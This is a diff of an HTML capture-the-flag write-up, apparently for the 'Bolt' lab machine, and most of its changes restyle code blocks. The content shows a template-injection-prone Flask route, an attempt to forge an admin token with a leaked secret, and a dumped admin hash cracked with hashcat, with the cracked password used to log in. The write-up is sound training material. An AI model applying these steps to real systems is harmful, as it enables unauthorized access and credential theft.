-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>@blueprint<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/confirm/changes/&lt;token&gt;&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">confirm_changes</span>(token):
-</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;&#34;&#34;Confirmation Token&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
-</span></span><span style="display:flex;"><span>        email <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>loads(token, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;changes-confirm-key&#34;</span>, max_age<span style="color:#ff79c6">=</span><span style="color:#bd93f9">86400</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span>:
-</span></span><span style="display:flex;"><span>        abort(<span style="color:#bd93f9">404</span>)
-</span></span><span style="display:flex;"><span>    user <span style="color:#ff79c6">=</span> User<span style="color:#ff79c6">.</span>query<span style="color:#ff79c6">.</span>filter_by(username<span style="color:#ff79c6">=</span>email)<span style="color:#ff79c6">.</span>first_or_404()
-</span></span><span style="display:flex;"><span>    name <span style="color:#ff79c6">=</span> user<span style="color:#ff79c6">.</span>profile_update
-</span></span><span style="display:flex;"><span>    template <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;templates/emails/update-name.html&#39;</span>, <span style="color:#f1fa8c">&#39;r&#39;</span>)<span style="color:#ff79c6">.</span>read()
-</span></span><span style="display:flex;"><span>    msg <span style="color:#ff79c6">=</span> Message(
-</span></span><span style="display:flex;"><span>            recipients<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>user<span style="color:#ff79c6">.</span>email<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>],
-</span></span><span style="display:flex;"><span>            sender <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;support@example.com&#39;</span>,
-</span></span><span style="display:flex;"><span>            reply_to <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;support@example.com&#39;</span>,
-</span></span><span style="display:flex;"><span>            subject <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Your profile changes have been confirmed.&#34;</span>
-</span></span><span style="display:flex;"><span>        )
-</span></span><span style="display:flex;"><span>    msg<span style="color:#ff79c6">.</span>html <span style="color:#ff79c6">=</span> render_template_string(template <span style="color:#ff79c6">%</span> name)
-</span></span><span style="display:flex;"><span>    mail<span style="color:#ff79c6">.</span>send(msg)
-</span></span><span style="display:flex;"><span>                                                                                                                                                                  <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;index.html&#39;</span>)
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">@blueprint<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/confirm/changes/&lt;token&gt;&#39;</span>)
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">confirm_changes</span>(token):
+    <span style="color:#f1fa8c">&#34;&#34;&#34;Confirmation Token&#34;&#34;&#34;</span>
+    <span style="color:#ff79c6">try</span>:
+        email <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>loads(token, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;changes-confirm-key&#34;</span>, max_age<span style="color:#ff79c6">=</span><span style="color:#bd93f9">86400</span>)
+    <span style="color:#ff79c6">except</span>:
+        abort(<span style="color:#bd93f9">404</span>)
+    user <span style="color:#ff79c6">=</span> User<span style="color:#ff79c6">.</span>query<span style="color:#ff79c6">.</span>filter_by(username<span style="color:#ff79c6">=</span>email)<span style="color:#ff79c6">.</span>first_or_404()
+    name <span style="color:#ff79c6">=</span> user<span style="color:#ff79c6">.</span>profile_update
+    template <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;templates/emails/update-name.html&#39;</span>, <span style="color:#f1fa8c">&#39;r&#39;</span>)<span style="color:#ff79c6">.</span>read()
+    msg <span style="color:#ff79c6">=</span> Message(
+            recipients<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>user<span style="color:#ff79c6">.</span>email<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>],
+            sender <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;support@example.com&#39;</span>,
+            reply_to <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;support@example.com&#39;</span>,
+            subject <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Your profile changes have been confirmed.&#34;</span>
+        )
+    msg<span style="color:#ff79c6">.</span>html <span style="color:#ff79c6">=</span> render_template_string(template <span style="color:#ff79c6">%</span> name)
+    mail<span style="color:#ff79c6">.</span>send(msg)
+                                                                                                                                                                  <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;index.html&#39;</span>)
+</code></pre></td></tr></table>
 </div>
 </div><p>With a bit of luck, the secret and the salt are the same in the Production system. As an example for user <strong>admin</strong>:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>$ python3
-</span></span><span style="display:flex;"><span>Python <span style="color:#bd93f9">3.8.2</span> (default, Jul <span style="color:#bd93f9">16</span> <span style="color:#bd93f9">2020</span>, <span style="color:#bd93f9">14</span>:<span style="color:#bd93f9">00</span>:<span style="color:#bd93f9">26</span>)
-</span></span><span style="display:flex;"><span>[GCC <span style="color:#bd93f9">9.3.0</span>] on linux
-</span></span><span style="display:flex;"><span>Type <span style="color:#f1fa8c">&#34;help&#34;</span>, <span style="color:#f1fa8c">&#34;copyright&#34;</span>, <span style="color:#f1fa8c">&#34;credits&#34;</span> <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#34;license&#34;</span> <span style="color:#ff79c6">for</span> more information<span style="color:#ff79c6">.</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">from</span> itsdangerous <span style="color:#ff79c6">import</span> URLSafeTimedSerializer
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> ts <span style="color:#ff79c6">=</span> URLSafeTimedSerializer(<span style="color:#f1fa8c">&#39;S#perS3crEt_007&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> user <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;admin&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> token <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>dumps(user, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;changes-confirm-key&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> token
-</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;ImFkbWluIg.YX5vNQ.qIo6-iaPzlnFFdosQeQTfgez7zo&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> email <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>loads(token, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;changes-confirm-key&#34;</span>, max_age<span style="color:#ff79c6">=</span><span style="color:#bd93f9">86400</span>)
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> email
-</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;admin&#39;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">$ python3
+Python <span style="color:#bd93f9">3.8.2</span> (default, Jul <span style="color:#bd93f9">16</span> <span style="color:#bd93f9">2020</span>, <span style="color:#bd93f9">14</span>:<span style="color:#bd93f9">00</span>:<span style="color:#bd93f9">26</span>)
+[GCC <span style="color:#bd93f9">9.3.0</span>] on linux
+Type <span style="color:#f1fa8c">&#34;help&#34;</span>, <span style="color:#f1fa8c">&#34;copyright&#34;</span>, <span style="color:#f1fa8c">&#34;credits&#34;</span> <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#34;license&#34;</span> <span style="color:#ff79c6">for</span> more information<span style="color:#ff79c6">.</span>
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">from</span> itsdangerous <span style="color:#ff79c6">import</span> URLSafeTimedSerializer
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> ts <span style="color:#ff79c6">=</span> URLSafeTimedSerializer(<span style="color:#f1fa8c">&#39;S#perS3crEt_007&#39;</span>)
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> user <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;admin&#39;</span>
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> token <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>dumps(user, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;changes-confirm-key&#39;</span>)
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> token
+<span style="color:#f1fa8c">&#39;ImFkbWluIg.YX5vNQ.qIo6-iaPzlnFFdosQeQTfgez7zo&#39;</span>
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> email <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>loads(token, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;changes-confirm-key&#34;</span>, max_age<span style="color:#ff79c6">=</span><span style="color:#bd93f9">86400</span>)
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> email
+<span style="color:#f1fa8c">&#39;admin&#39;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>The attempt miserably fail because the URLSafeTimedSerializer is not using the same Time signature as the server.</p>
 <pre><code>itsdangerous.exc.BadTimeSignature: Signature b&quot;qIo6-iaPzlnFFdosQeQTfgez7zo'&quot; does not match
@@ -728,47 +728,47 @@ _ Debugger is active! \* Debugger PIN: 959-707-878
 </tbody>
 </table>
 <p>Exploring the deleted db.sqlite3 reveals admin hash</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>[I] ➜ sqlite3
-</span></span><span style="display:flex;"><span>SQLite <span style="color:#ff79c6">version</span> <span style="color:#bd93f9">3</span>.<span style="color:#bd93f9">28</span>.<span style="color:#bd93f9">0</span> <span style="color:#bd93f9">2019</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span> <span style="color:#bd93f9">19</span>:<span style="color:#bd93f9">49</span>:<span style="color:#bd93f9">53</span>
-</span></span><span style="display:flex;"><span>Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">usage</span> hints.
-</span></span><span style="display:flex;"><span>Connected <span style="color:#ff79c6">to</span> a transient <span style="color:#ff79c6">in</span><span style="color:#ff79c6">-</span>memory <span style="color:#ff79c6">database</span>.
-</span></span><span style="display:flex;"><span>Use <span style="color:#f1fa8c">&#34;.open FILENAME&#34;</span> <span style="color:#ff79c6">to</span> reopen <span style="color:#ff79c6">on</span> a persistent <span style="color:#ff79c6">database</span>.
-</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> attach <span style="color:#f1fa8c">&#34;db.sqlite3&#34;</span> <span style="color:#ff79c6">as</span> db
-</span></span><span style="display:flex;"><span>...<span style="color:#ff79c6">&gt;</span> ;
-</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> .databases;
-</span></span><span style="display:flex;"><span>Error: <span style="color:#ff79c6">unknown</span> command <span style="color:#ff79c6">or</span> invalid arguments: <span style="color:#f1fa8c">&#34;databases;&#34;</span>. Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> help
-</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> .databases
-</span></span><span style="display:flex;"><span>main:
-</span></span><span style="display:flex;"><span>db: <span style="color:#ff79c6">/</span>private<span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>bolt<span style="color:#ff79c6">/</span>a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2<span style="color:#ff79c6">/</span>db.sqlite3
-</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> .tables
-</span></span><span style="display:flex;"><span>db.<span style="color:#ff79c6">User</span>
-</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> \<span style="color:#ff79c6">*</span> <span style="color:#ff79c6">from</span> db.<span style="color:#ff79c6">User</span>
-</span></span><span style="display:flex;"><span>...<span style="color:#ff79c6">&gt;</span> ;
-</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">|</span><span style="color:#ff79c6">admin</span><span style="color:#ff79c6">|</span><span style="color:#ff79c6">admin</span><span style="color:#ff79c6">@</span>bolt.htb<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$sm1RceCh$rSd3PygnS<span style="color:#ff79c6">/</span><span style="color:#bd93f9">6</span>jlFDfF2J5q.<span style="color:#ff79c6">||</span>
-</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">[I] ➜ sqlite3
+SQLite <span style="color:#ff79c6">version</span> <span style="color:#bd93f9">3</span>.<span style="color:#bd93f9">28</span>.<span style="color:#bd93f9">0</span> <span style="color:#bd93f9">2019</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span> <span style="color:#bd93f9">19</span>:<span style="color:#bd93f9">49</span>:<span style="color:#bd93f9">53</span>
+Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">usage</span> hints.
+Connected <span style="color:#ff79c6">to</span> a transient <span style="color:#ff79c6">in</span><span style="color:#ff79c6">-</span>memory <span style="color:#ff79c6">database</span>.
+Use <span style="color:#f1fa8c">&#34;.open FILENAME&#34;</span> <span style="color:#ff79c6">to</span> reopen <span style="color:#ff79c6">on</span> a persistent <span style="color:#ff79c6">database</span>.
+sqlite<span style="color:#ff79c6">&gt;</span> attach <span style="color:#f1fa8c">&#34;db.sqlite3&#34;</span> <span style="color:#ff79c6">as</span> db
+...<span style="color:#ff79c6">&gt;</span> ;
+sqlite<span style="color:#ff79c6">&gt;</span> .databases;
+Error: <span style="color:#ff79c6">unknown</span> command <span style="color:#ff79c6">or</span> invalid arguments: <span style="color:#f1fa8c">&#34;databases;&#34;</span>. Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> help
+sqlite<span style="color:#ff79c6">&gt;</span> .databases
+main:
+db: <span style="color:#ff79c6">/</span>private<span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>bolt<span style="color:#ff79c6">/</span>a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2<span style="color:#ff79c6">/</span>db.sqlite3
+sqlite<span style="color:#ff79c6">&gt;</span> .tables
+db.<span style="color:#ff79c6">User</span>
+sqlite<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> \<span style="color:#ff79c6">*</span> <span style="color:#ff79c6">from</span> db.<span style="color:#ff79c6">User</span>
+...<span style="color:#ff79c6">&gt;</span> ;
+<span style="color:#bd93f9">1</span><span style="color:#ff79c6">|</span><span style="color:#ff79c6">admin</span><span style="color:#ff79c6">|</span><span style="color:#ff79c6">admin</span><span style="color:#ff79c6">@</span>bolt.htb<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$sm1RceCh$rSd3PygnS<span style="color:#ff79c6">/</span><span style="color:#bd93f9">6</span>jlFDfF2J5q.<span style="color:#ff79c6">||</span>
+sqlite<span style="color:#ff79c6">&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><pre><code>hashcat -m 500 ~/hashes.txt /opt/dictionaries/rockyou.txt --force
 [..]
@@ -776,47 +776,47 @@ hashcat -m 500 ~/hashes.txt /opt/dictionaries/rockyou.txt --show
 $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt
 </code></pre>
 <p>We can indeed successfully login with admin:deadbolt and a chat conversation reveals the demo is restricted to invite only. Looking at deleted file /app/base/routes.py we can find the invitation code, if the use does not exist and the email is not registered then it will be created :)</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
